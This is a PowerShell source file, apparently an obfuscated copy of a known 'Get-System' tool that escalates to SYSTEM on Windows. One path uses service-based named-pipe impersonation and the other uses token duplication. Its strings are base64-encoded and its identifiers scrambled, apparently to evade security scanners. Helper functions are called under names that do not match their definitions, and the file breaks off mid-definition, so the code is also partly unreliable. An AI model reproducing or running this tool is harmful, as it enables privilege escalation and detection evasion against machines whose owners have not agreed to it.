function systemget {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingWMICmdlet', '')]
    [CmdletBinding(DefaultParameterSetName = 'NamedPipe')]
    param(
        [Parameter(ParameterSetName = 'NamedPipe')]
        [Parameter(ParameterSetName = 'Token')]
        [String]
        [ValidateSet('NamedPipe', 'Token')]
        $Technique = 'NamedPipe',

        [Parameter(ParameterSetName = 'NamedPipe')]
        [String]
        $ServiceName = 'TestSVC',

        [Parameter(ParameterSetName = 'NamedPipe')]
        [String]
        $PipeName = 'TestSVC',

        [Parameter(ParameterSetName = 'RevToSelf')]
        [Switch]
        $RevToSelf,

        [Parameter(ParameterSetName = 'WhoAmI')]
        [Switch]
        $WhoAmI
    )

    $ErrorActionPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcAA=')))

    
    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]

            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),

            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        ${_/\/==\___/\_/=\/} = [AppDomain]::CurrentDomain
        ${___/\_/\/=\__/==\} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABlAGQARABlAGwAZQBnAGEAdABlAA=='))))
        ${/==\_/=\/=====\_/} = ${_/\/==\___/\_/=\/}.DefineDynamicAssembly(${___/\_/\/=\__/==\}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        ${__/\__/\_/=\/==\_} = ${/==\_/=\/=====\_/}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAE0AZQBtAG8AcgB5AE0AbwBkAHUAbABlAA=='))), $false)
        ${/=====\/=\_/\_/\_} = ${__/\__/\_/=\/==\_}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AEQAZQBsAGUAZwBhAHQAZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGEAcwBzACwAIABQAHUAYgBsAGkAYwAsACAAUwBlAGEAbABlAGQALAAgAEEAbgBzAGkAQwBsAGEAcwBzACwAIABBAHUAdABvAEMAbABhAHMAcwA='))), [System.MulticastDelegate])
        ${/==\/===\___/==\/} = ${/=====\/=\_/\_/\_}.DefineConstructor($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBUAFMAcABlAGMAaQBhAGwATgBhAG0AZQAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFAAdQBiAGwAaQBjAA=='))), [System.Reflection.CallingConventions]::Standard, $Parameters)
        ${/==\/===\___/==\/}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
        ${/=\/\/\_/=====\/=} = ${/=====\/=\_/\_/\_}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAaQBkAGUAQgB5AFMAaQBnACwAIABOAGUAdwBTAGwAbwB0ACwAIABWAGkAcgB0AHUAYQBsAA=='))), $ReturnType, $Parameters)
        ${/=\/\/\_/=====\/=}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))

        echo ${/=====\/=\_/\_/\_}.CreateType()
    }

    
    function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]

            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,

            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        
        ${_/\___/\/====\/==} = [AppDomain]::CurrentDomain.GetAssemblies() |
            ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBkAGwAbAA=')))) }
        ${_/=\/=\_/\/\/=\/=} = ${_/\___/\/====\/==}.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBXAGkAbgAzADIALgBVAG4AcwBhAGYAZQBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAA=='))))
        
        ${____/=====\____/\} = ${_/=\/=\_/\/\/=\/=}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQATQBvAGQAdQBsAGUASABhAG4AZABsAGUA'))))
        ${/===\__/\___/\/\_} = ${_/=\/=\_/\/\/=\/=}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA=='))))
        
        ${__/\/==\____/\__/} = ${____/=====\____/\}.Invoke($null, @($Module))
        ${/===\___/\/\/=\/\} = New-Object IntPtr
        ${__/\_/\_/=\/=\/==} = New-Object System.Runtime.InteropServices.HandleRef(${/===\___/\/\/=\/\}, ${__/\/==\____/\__/})

        
        echo ${/===\__/\___/\/\_}.Invoke($null, @([System.Runtime.InteropServices.HandleRef]${__/\_/\_/=\/=\/==}, $Procedure))
    }

    
    
    function Local:Get-SystemNamedPipe {
        param(
            [String]
            $ServiceName = 'TestSVC',

            [String]
            $PipeName = 'TestSVC'
        )

        ${_/\_____/==\_/===} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JQBDAE8ATQBTAFAARQBDACUAIAAvAEMAIABzAHQAYQByAHQAIAAlAEMATwBNAFMAUABFAEMAJQAgAC8AQwAgACIAdABpAG0AZQBvAHUAdAAgAC8AdAAgADMAIAA+AG4AdQBsACYAJgBlAGMAaABvACAAJABQAGkAcABlAE4AYQBtAGUAIAA+ACAAXABcAC4AXABwAGkAcABlAFwAJABQAGkAcABlAE4AYQBtAGUAIgA=')))

        Add-Type -Assembly System.Core

        
        ${___/=\_/=\/=\_/\_} = New-Object System.IO.Pipes.PipeSecurity
        ${/=\__/\/=\_/\___/} = New-Object System.IO.Pipes.PipeAccessRule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB2AGUAcgB5AG8AbgBlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABXAHIAaQB0AGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA=='))))
        ${___/=\_/=\/=\_/\_}.AddAccessRule(${/=\__/\/=\_/\___/})
        ${/==\_/\/==\/\___/} = New-Object System.IO.Pipes.NamedPipeServerStream($PipeName, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAE8AdQB0AA=='))), 100, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AHQAZQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA='))), 1024, 1024, ${___/=\_/=\/=\_/\_})

        ${_/===\___/\/=\_/=} = ${/==\_/\/==\/\___/}.SafePipeHandle.DangerousGetHandle()

        
        
        ${/==\/\_/\_/\__/=\} = ___/==\_/\__/=\/=\ Advapi32.dll ImpersonateNamedPipeClient
        ${___/=\/=\_/==\/\/} = __/\____/\_/=\___/ @( [Int] ) ([Int])
        ${__/\/==\_/\/==\__} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/==\/\_/\_/\__/=\}, ${___/=\/=\_/==\/\/})

        ${_/\__/\__/==\_/=\} = ___/==\_/\__/=\/=\ Advapi32.dll CloseServiceHandle
        ${/===\/===\_/\/\_/} = __/\____/\_/=\___/ @( [IntPtr] ) ([Int])
        ${__/======\__/\/\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\__/\__/==\_/=\}, ${/===\/===\_/\/\_/})

        ${_/=\_/=\_/==\_/\/} = ___/==\_/\__/=\/=\ Advapi32.dll OpenSCManagerA
        ${__/\__/====\/\_/=} = __/\____/\_/=\___/ @( [String], [String], [Int]) ([IntPtr])
        ${____/\/\_/===\_/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/=\_/=\_/==\_/\/}, ${__/\__/====\/\_/=})

        ${_/=\/=\/\/==\/\__} = ___/==\_/\__/=\/=\ Advapi32.dll OpenServiceA
        ${/==\/===\__/\_/\/} = __/\____/\_/=\___/ @( [IntPtr], [String], [Int]) ([IntPtr])
        ${___/==\_/\/\__/\_} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/=\/=\/\/==\/\__}, ${/==\/===\__/\_/\/})

        ${_/=\/==\_/\_/====} = ___/==\_/\__/=\/=\ Advapi32.dll CreateServiceA
        ${___/\_/==\_____/\} = __/\____/\_/=\___/ @( [IntPtr], [String], [String], [Int], [Int], [Int], [Int], [String], [String], [Int], [Int], [Int], [Int]) ([IntPtr])
        ${___/=\__/=\/=\/\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/=\/==\_/\_/====}, ${___/\_/==\_____/\})

        ${___/=\/\/===\_/\_} = ___/==\_/\__/=\/=\ Advapi32.dll StartServiceA
        ${_____/\____/=\__/} = __/\____/\_/=\___/ @( [IntPtr], [Int], [Int]) ([IntPtr])
        ${/=\/===\___/\/=\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${___/=\/\/===\_/\_}, ${_____/\____/=\__/})

        ${__/=\/\/\_/=\/==\} = ___/==\_/\__/=\/=\ Advapi32.dll DeleteService
        ${__/\_/\/\_/======} = __/\____/\_/=\___/ @( [IntPtr] ) ([IntPtr])
        ${___/\/\/\/==\__/\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/=\/\/\_/=\/==\}, ${__/\_/\/\_/======})

        ${_/=\/\/=\_/\_/\/\} = ___/==\_/\__/=\/=\ Kernel32.dll GetLastError
        ${/===\/\_/\_/===\/} = __/\____/\_/=\___/ @() ([Int])
        ${/=\/=\/=\/======\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/=\/\/=\_/\_/\/\}, ${/===\/\_/\_/===\/})

        
        
        
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABPAHAAZQBuAGkAbgBnACAAcwBlAHIAdgBpAGMAZQAgAG0AYQBuAGEAZwBlAHIA')))
        ${_/\/\___/==\/\__/} = ${____/\/\_/===\_/=}.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAGwAbwBjAGEAbABoAG8AcwB0AA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBzAEEAYwB0AGkAdgBlAA=='))), 0xF003F)
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABTAGUAcgB2AGkAYwBlACAAbQBhAG4AYQBnAGUAcgAgAGgAYQBuAGQAbABlADoAIAAkAE0AYQBuAGEAZwBlAHIASABhAG4AZABsAGUA')))

        
        if (${_/\/\___/==\/\__/} -and (${_/\/\___/==\/\__/} -ne 0)) {

            
            
            
            
            
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABDAHIAZQBhAHQAaQBuAGcAIABuAGUAdwAgAHMAZQByAHYAaQBjAGUAOgAgACcAJABTAGUAcgB2AGkAYwBlAE4AYQBtAGUAJwA=')))
            try {
                ${/=\/\_/\/\__/\___} = ${___/=\__/=\/=\/\/}.Invoke(${_/\/\___/==\/\__/}, $ServiceName, $ServiceName, 0xF003F, 0x10, 0x3, 0x1, ${_/\_____/==\_/===}, $null, $null, $null, $null, $null)
                ${__/=\/\/\/====\_/} = ${/=\/=\/=\/======\}.Invoke()
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYwByAGUAYQB0AGkAbgBnACAAcwBlAHIAdgBpAGMAZQAgADoAIAAkAF8A')))
                ${/=\/\_/\/\__/\___} = 0
            }
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABDAHIAZQBhAHQAZQBTAGUAcgB2AGkAYwBlAEEAIABIAGEAbgBkAGwAZQA6ACAAJABTAGUAcgB2AGkAYwBlAEgAYQBuAGQAbABlAA==')))

            if (${/=\/\_/\/\__/\___} -and (${/=\/\_/\/\__/\___} -ne 0)) {
                ${____/=\_/==\/=\/\} = $True
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABTAGUAcgB2AGkAYwBlACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIABjAHIAZQBhAHQAZQBkAA==')))

                
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABDAGwAbwBzAGkAbgBnACAAcwBlAHIAdgBpAGMAZQAgAGgAYQBuAGQAbABlAA==')))
                $Null = ${__/======\__/\/\/}.Invoke(${/=\/\_/\/\__/\___})

                
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABPAHAAZQBuAGkAbgBnACAAdABoAGUAIABzAGUAcgB2AGkAYwBlACAAJwAkAFMAZQByAHYAaQBjAGUATgBhAG0AZQAnAA==')))
                ${/=\/\_/\/\__/\___} = ${___/==\_/\/\__/\_}.Invoke(${_/\/\___/==\/\__/}, $ServiceName, 0xF003F)
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABPAHAAZQBuAFMAZQByAHYAaQBjAGUAQQAgAGgAYQBuAGQAbABlADoAIAAkAFMAZQByAHYAaQBjAGUASABhAG4AZABsAGUA')))

                if (${/=\/\_/\/\__/\___} -and (${/=\/\_/\/\__/\___} -ne 0)){

                    
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABTAHQAYQByAHQAaQBuAGcAIAB0AGgAZQAgAHMAZQByAHYAaQBjAGUA')))
                    ${__/\___/==\_/=\__} = ${/=\/===\___/\/=\/}.Invoke(${/=\/\_/\/\__/\___}, $null, $null)
                    ${__/=\/\/\/====\_/} = ${/=\/=\/=\/======\}.Invoke()

                    
                    if (${__/\___/==\_/=\__} -ne 0){
                        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABTAGUAcgB2AGkAYwBlACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIABzAHQAYQByAHQAZQBkAA==')))
                        
                        sleep -s 1
                    }
                    else{
                        if (${__/=\/\/\/====\_/} -eq 1053){
                            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABDAG8AbQBtAGEAbgBkACAAZABpAGQAbgAnAHQAIAByAGUAcwBwAG8AbgBkACAAdABvACAAcwB0AGEAcgB0AA==')))
                        }
                        else{
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABTAHQAYQByAHQAUwBlAHIAdgBpAGMAZQAgAGYAYQBpAGwAZQBkACwAIABMAGEAcwB0AEUAcgByAG8AcgA6ACAAJABlAHIAcgA=')))
                        }
                        
                        sleep -s 1
                    }

                    
                    
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABEAGUAbABlAHQAaQBuAGcAIAB0AGgAZQAgAHMAZQByAHYAaQBjAGUAIAAnACQAUwBlAHIAdgBpAGMAZQBOAGEAbQBlACcA')))
                    ${__/\___/==\_/=\__} = ${___/\/\/\/==\__/\}.invoke(${/=\/\_/\/\__/\___})
                    ${__/=\/\/\/====\_/} = ${/=\/=\/=\/======\}.Invoke()

                    if (${__/\___/==\_/=\__} -eq 0){
                        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABEAGUAbABlAHQAZQBTAGUAcgB2AGkAYwBlACAAZgBhAGkAbABlAGQALAAgAEwAYQBzAHQARQByAHIAbwByADoAIAAkAGUAcgByAA==')))
                    }
                    else{
                        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABTAGUAcgB2AGkAYwBlACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIABkAGUAbABlAHQAZQBkAA==')))
                    }

                    
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABDAGwAbwBzAGkAbgBnACAAdABoAGUAIABzAGUAcgB2AGkAYwBlACAAaABhAG4AZABsAGUA')))
                    ${__/\___/==\_/=\__} = ${__/======\__/\/\/}.Invoke(${/=\/\_/\/\__/\___})
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABTAGUAcgB2AGkAYwBlACAAaABhAG4AZABsAGUAIABjAGwAbwBzAGUAZAAgAG8AZgBmAA==')))
                }
                else {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABPAHAAZQBuAFMAZQByAHYAaQBjAGUAQQAgAGYAYQBpAGwAZQBkACwAIABMAGEAcwB0AEUAcgByAG8AcgA6ACAAJABlAHIAcgA=')))
                }
            }

            else {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABDAHIAZQBhAHQAZQBTAGUAcgB2AGkAYwBlACAAZgBhAGkAbABlAGQALAAgAEwAYQBzAHQARQByAHIAbwByADoAIAAkAGUAcgByAA==')))
            }

            
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABDAGwAbwBzAGkAbgBnACAAdABoAGUAIABtAGEAbgBhAGcAZQByACAAaABhAG4AZABsAGUA')))
            $Null = ${__/======\__/\/\/}.Invoke(${_/\/\___/==\/\__/})
        }
        else {
            
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABPAHAAZQBuAFMAQwBNAGEAbgBhAGcAZQByACAAZgBhAGkAbABlAGQALAAgAEwAYQBzAHQARQByAHIAbwByADoAIAAkAGUAcgByAA==')))
        }

        if(${____/=\_/==\/=\/\}) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABXAGEAaQB0AGkAbgBnACAAZgBvAHIAIABwAGkAcABlACAAYwBvAG4AbgBlAGMAdABpAG8AbgA=')))
            ${/==\_/\/==\/\___/}.WaitForConnection()

            $Null = (New-Object System.IO.StreamReader(${/==\_/\/==\/\___/})).ReadToEnd()

            ${/=\__/====\_/\___} = ${__/\/==\_/\/==\__}.Invoke([Int]${_/===\___/\/=\_/=})
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFMAeQBzAHQAZQBtAF0AIABJAG0AcABlAHIAcwBvAG4AYQB0AGUATgBhAG0AZQBkAFAAaQBwAGUAQwBsAGkAZQBuAHQAOgAgACQATwB1AHQA')))
        }

        
        ${/==\_/\/==\/\___/}.Dispose()
    }

    
    
    
    Function Local:Get-SystemToken {
        [CmdletBinding()] param()

        ${___/\_/\/=\__/==\} = New-Object Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGoAUAByAGkAdgA='))))
        ${/==\_/=\/=====\_/} = [Appdomain]::Currentdomain.DefineDynamicAssembly(${___/\_/\/=\__/==\}, [Reflection.Emit.AssemblyBuilderAccess]::Run)
        ${__/\__/\_/=\/==\_} = ${/==\_/=\/=====\_/}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGoAUAByAGkAdgA='))), $False)
        ${_/\___/\___/\/=\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))

        ${/==\_/\/====\/=\/} = ${__/\__/\_/=\/==\_}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAUAByAGkAdgAxAEwAdQBpAGQA'))), ${_/\___/\___/\/=\/}, [System.ValueType])
        ${/==\_/\/====\/=\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbgB0AA=='))), [Int32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
        ${/==\_/\/====\/=\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TAB1AGkAZAA='))), [Int64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
        ${/==\_/\/====\/=\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgA='))), [Int32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
        ${__/=\__/\_/\/\/=\} = ${/==\_/\/====\/=\/}.CreateType()

        ${/\_____/\___/=\/=} = ${__/\__/\_/=\/==\_}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARAA='))), ${_/\___/\___/\/=\/}, [System.ValueType])
        ${/\_____/\___/=\/=}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
        ${/\_____/\___/=\/=}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
        ${___/\___/===\/==\} = ${/\_____/\___/=\/=}.CreateType()

        ${/=\/\/=\_/\/\/\__} = ${__/\__/\_/=\/==\_}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARABfAEEATgBEAF8AQQBUAFQAUgBJAEIAVQBUAEUAUwA='))), ${_/\___/\___/\/=\/}, [System.ValueType])
        ${/=\/\/=\_/\/\/\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TAB1AGkAZAA='))), ${___/\___/===\/==\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
        ${/=\/\/=\_/\/\/\__}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
        ${__/\/=\/=\_/=\_/\} = ${/=\/\/=\_/\/\/\__}.CreateType()

        ${__/=\/\__/\/\/\_/} = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
        ${__/==\/\/\_/===\_} = [Runtime.InteropServices.UnmanagedType]::ByValArray
        ${_/\/\__/\/\__/\_/} = @([Runtime.InteropServices.MarshalAsAttribute].GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBDAG8AbgBzAHQA')))))

        ${__/=\/==\/=\___/\} = ${__/\__/\_/=\/==\_}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABPAEsARQBOAF8AUABSAEkAVgBJAEwARQBHAEUAUwA='))), ${_/\___/\___/\/=\/}, [System.ValueType])
        ${__/=\/==\/=\___/\}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAQwBvAHUAbgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
        ${____/=\/======\/\} = ${__/=\/==\/=\___/\}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAcwA='))), ${__/\/=\/=\_/=\_/\}.MakeArrayType(), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        ${_/\_/\/==\____/=\} = New-Object Reflection.Emit.CustomAttributeBuilder(${__/=\/\__/\/\/\_/}, ${__/==\/\/\_/===\_}, ${_/\/\__/\/\__/\_/}, @([Int32] 1))
        ${____/=\/======\/\}.SetCustomAttribute(${_/\_/\/==\____/=\})
        

        ${_/\_/\/==\____/=\} = New-Object Reflection.Emit.CustomAttributeBuilder(
            ([Runtime.InteropServices.DllImportAttribute].GetConstructors()[0]),
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAHYAYQBwAGkAMwAyAC4AZABsAGwA'))),
            @([Runtime.InteropServices.DllImportAttribute].GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQATABhAHMAdABFAHIAcgBvAHIA'))))),
            @([Bool] $True)
        )

        ${_/=\/==\_____/=\/} = New-Object Reflection.Emit.CustomAttributeBuilder(
            ([Runtime.InteropServices.DllImportAttribute].GetConstructors()[0]),
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))),
            @([Runtime.InteropServices.DllImportAttribute].GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQATABhAHMAdABFAHIAcgBvAHIA'))))),
            @([Bool] $True)
        )

        ${_/\/===\__/\_/===} = ${__/\__/\_/=\/==\_}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAE0AZQB0AGgAbwBkAHMA'))), ${_/\___/\___/\/=\/}, [ValueType])
        ${_/\/===\__/\_/===}.DefinePInvokeMethod(
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBQAHIAbwBjAGUAcwBzAA=='))),
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))),
            [Reflection.MethodAttributes] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA=='))),
            [Reflection.CallingConventions]::Standard,
            [IntPtr],
            @([UInt32], [Bool], [UInt32]),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwA=')))).SetCustomAttribute(${_/=\/==\_____/=\/})

        ${_/\/===\__/\_/===}.DefinePInvokeMethod(
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAEgAYQBuAGQAbABlAA=='))),
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))),
            [Reflection.MethodAttributes] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA=='))),
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([IntPtr]),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwA=')))).SetCustomAttribute(${_/=\/==\_____/=\/})

        ${_/\/===\__/\_/===}.DefinePInvokeMethod(
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB1AHAAbABpAGMAYQB0AGUAVABvAGsAZQBuAA=='))),
